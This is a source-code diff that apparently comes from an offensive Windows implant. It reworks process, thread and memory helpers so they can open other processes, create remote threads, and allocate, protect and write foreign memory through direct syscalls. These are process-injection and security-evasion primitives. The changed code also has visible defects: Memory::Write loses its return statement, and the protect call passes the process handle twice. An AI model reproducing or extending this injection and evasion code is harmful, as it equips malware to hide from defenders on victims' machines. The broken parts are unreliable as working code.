@@ -106,7 +106,20 @@ auto DECLFN Process::Open(
     _In_ BOOL  InheritHandle,
     _In_ ULONG ProcessID
 ) -> HANDLE {
-    return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
+    HANDLE Handle = INVALID_HANDLE_VALUE;
+
+    if ( Self->Sys->Enabled ) {
+        NTSTATUS          Status   = STATUS_UNSUCCESSFUL;
+        OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
+        CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
+
+        Status = Self->Sys->Run( syOpenProc, &Handle, RightsAccess, &ClientID );
+        Self->Ntdll.RtlNtStatusToDosError( Status );
+    } else {
+        Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
+    }
+
+    return Handle;
 }
 
 auto DECLFN Process::Create(
@@ -200,7 +213,14 @@ _KH_END:
     return Success;
 }
 
-auto DECLFN Thread::RndEnum( VOID ) -> ULONG {
+#define ALL_THREADS 0x05
+
+auto DECLFN Thread::Enum( 
+    _In_      INT8  Type,
+    _In_opt_  ULONG ProcessID,
+    _In_opt_  ULONG Flags,
+    _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
+) -> ULONG {
     PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
     PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
     PVOID                       ValToFree     = NULL;
@@ -225,8 +245,19 @@ auto DECLFN Thread::RndEnum( VOID ) -> ULONG {
             SysThreadInfo = SysProcInfo->Threads;
 
             for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
-                if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
-                    ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
+                if ( Type == TdRandom ) {
+                    if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
+                        ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
+                    }    
+                } else if ( Type == TdTarget ) {
+                    if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueProcess ) == ProcessID ) {
+                        Mem::Copy( ThreadInfo, SysThreadInfo, sizeof( SYSTEM_THREAD_INFORMATION ) );
+                        goto _KH_END;
+                    }
+                } else if ( Type == TdHwbp ) {
+                    if ( Flags == ALL_THREADS ) {
+                        // Self->Hwbp->SetBreak(  )
+                    }
                 }
             }
         }
@@ -248,11 +279,24 @@ auto DECLFN Thread::Create(
     _In_  ULONG  Flags,
     _Out_ PULONG ThreadID
 ) -> HANDLE {
-    if ( ProcessHandle ) {
-        return Self->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
+    HANDLE Handle = INVALID_HANDLE_VALUE;
+
+    if ( Self->Sys->Enabled ) {
+        NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+        if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) ProcessHandle = NtCurrentProcess();
+
+        Status = Self->Sys->Run( syCrThread, &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
+        Self->Usf->NtStatusToError( Status );
     } else {
-        return Self->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
-    }
+        if ( ProcessHandle ) {
+            Handle = Self->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
+        } else {
+            Handle = Self->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
+        }
+    }    
+
+    return Handle;
 }
 
 auto DECLFN Thread::Open(
@@ -263,6 +307,16 @@ auto DECLFN Thread::Open(
     return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
 }
 
+auto DECLFN Memory::Read(
+    _In_  HANDLE  Handle,
+    _In_  PVOID   Base,
+    _In_  PBYTE   Buffer,
+    _In_  SIZE_T  Size,
+    _Out_ PSIZE_T Reads
+) -> BOOL {
+    return Self->Krnl32.ReadProcessMemory( Handle, Base, Buffer, Size, Reads );
+}
+
 auto DECLFN Memory::Alloc(
     _In_ HANDLE Handle,
     _In_ PVOID Base,
@@ -270,11 +324,26 @@ auto DECLFN Memory::Alloc(
     _In_ ULONG AllocType,
     _In_ ULONG Protect
 ) -> PVOID {
-    if ( !Handle ) {
-        return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
+    PVOID BaseAddress = NULL;
+
+    if ( Self->Sys->Enabled ) {
+        NTSTATUS Status = STATUS_UNSUCCESSFUL;
+        PVOID    TmpPtr = Base;
+
+        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
+
+        Status = Self->Sys->Run( syAlloc, Handle, &TmpPtr, 0, &Size, AllocType, Protect );
+        BaseAddress = TmpPtr;
+        Self->Usf->NtStatusToError( Status );
     } else {
-        return Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
+        if ( Handle ) {
+            BaseAddress = Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
+        } else {
+            BaseAddress = Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
+        }
     }
+    
+    return BaseAddress;
 }
 
 auto DECLFN Memory::Protect(
@@ -284,11 +353,27 @@ auto DECLFN Memory::Protect(
     _In_  ULONG  NewProt,
     _Out_ PULONG OldProt
 ) -> BOOL {
-    if ( !Handle ) {
-        return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
+    BOOL Success = FALSE;
+
+    if ( Self->Sys->Enabled ) {
+        NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+        if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
+
+        Status = Self->Sys->Run( syProtect, Handle, Handle, Base, Size, NewProt, OldProt );
+        Self->Usf->NtStatusToError( Status );
+
+        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
+        else   Success = FALSE; 
     } else {
-        return Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
+        if ( Handle ) {
+            Success = Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
+        } else {
+            Success = Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
+        }
     }
+    
+    return Success;
 }
 
 auto DECLFN Memory::Write(
@@ -297,9 +382,21 @@ auto DECLFN Memory::Write(
     _In_ PBYTE  Buffer,
     _In_ ULONG  Size
 ) -> BOOL {
+    BOOL      Success = FALSE;
     ULONG_PTR Written = 0;
 
-    return Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
+    if ( Self->Sys->Enabled ) {
+        NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+        Status = Self->Sys->Run( syWrite, Handle, Base, Buffer, Size, &Written );
+        Self->Usf->NtStatusToError( Status );
+
+        if   ( Status == STATUS_SUCCESS ) Success = TRUE;
+        else   Success = FALSE; 
+    } else {
+        Success = Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
+    }
+    
 }
 
 auto DECLFN Memory::Free(
